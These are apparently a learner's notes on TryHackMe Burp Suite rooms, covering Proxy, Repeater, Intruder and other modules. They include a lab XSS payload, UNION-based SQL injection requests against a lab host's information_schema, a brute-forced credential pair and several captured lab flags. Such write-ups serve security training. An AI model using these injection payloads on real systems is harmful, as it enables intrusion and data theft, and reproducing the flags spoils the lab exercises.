# Burp Suite - 

**Overview**

We are exploring the different tabs Burp Suite offers. The most important tabs
are (a) Proxy: make request (b) Repeater: we intercept the request, make change
and resend it. Other modules include:
- Intruder: brute force
- Sequencer: measure entropy in tokens
- Decoder: similar to codechef magic
- Comparer: comparing two files bytes per bytes or char by char


## Burp Suite - The Basics

- Tools in Burp Suite:
    * Proxy: intercepting requests/response
    * Repeater: intercept and modify requests
    * Intruder: bruteforce attacks or fuzz endpoints
    * Decoder: encoding or decoding payload
    * Comparer: comparing files bytes per bytes
    * Sequencer: assess randomness in token or cookie session
- Views in dashboard: Tasks, Event Logs, Issue Activities, Advisory
- Project options tabs: connections, http, tls, sessions, misc
- 'Proxy' Introduction
- 'Target' Introduction
    * Site Map
    * Scope
    * Issue Definitions
- To perform XSS using Burp Suite: intercept package and change payload before forwarding

```
>>> Forward and backward in tickets
THM{NmNlZTliNGE1MWU1ZTQzMzgzNmFiNWVk}

email=pentester%40example.thm&content=test+attack
<script>alert('Succ3ssful XSS');</script>
>>> email=<script>alert('Succ3ssful XSS');</script>&content=test+attack

```

## Burp Suite - Repeater

- change: `Connection: close` to `Connection: open` => `Connection: keep-alive`
- Inspector: 'skipped'


**Practical 1: adding header in request**

```
>>> FlagAuthorised: True
THM{Yzg2MWI2ZDhlYzdlNGFiZTUzZTIzMzVi}
```


**SQLi Injections**

Goal: we see that if we modify GET requests, it modifies select statement.
We will use SQLi injection to find the flag

In repeater:

---
GET /about/2' HTTP/1.1
Host: 10.10.252.34
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-CA,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
---

<code>Invalid statement: <code>SELECT firstName, lastName, pfpLink, role, bio FROM people WHERE id = 2'</code>

>>> GET /about/0 UNION ALL SELECT column_name,null,null,null,null FROM information_schema.columns where table_name='people' HTTP/1.1


>>> GET /about/0 UNION ALL SELECT group_concat(column_name),null,null,null,null FROM information_schema.columns where table_name='people' HTTP/1.1

       <title>About | id,firstName,lastName,pfpLink,role,shortRole,bio,notes None</title>

THM{ZGE3OTUyZGMyMzkwNjJmZjg3Mzk1NjJh}

## Burp Suite - Intruder

We can use the 'Intruder' to send payload. Different attack types
* Sniper: send several payload -> if we have two list, test all combinations (brute force)
  + ex: replacing username=$username&password=$password
* Battering Ram: send the same payload to each field
  + ex: replacing username=$field&password=$field
* Pitchfork: given two list test with same index (zip)
  + ex: replacing username=$usernames[i]&password=$password[i]
* 


username=m%2erivera&password=letmein1


## Burp Suite - Other Modules


- Decoder Module: act like CyberChef 'Magic' to encode/decode hash and string

>>> md5sum * (for the keys)

- Compararer: comparing files bytes or ASCII side-by-side

- Sequencer: measure entropy (randomness) of strings (TO REVIEW)

## Burp Suite - Extender

The 'Extender' can be used to download community extension.
We have downloaded [jython jar standalone file](https://www.jython.org/download)


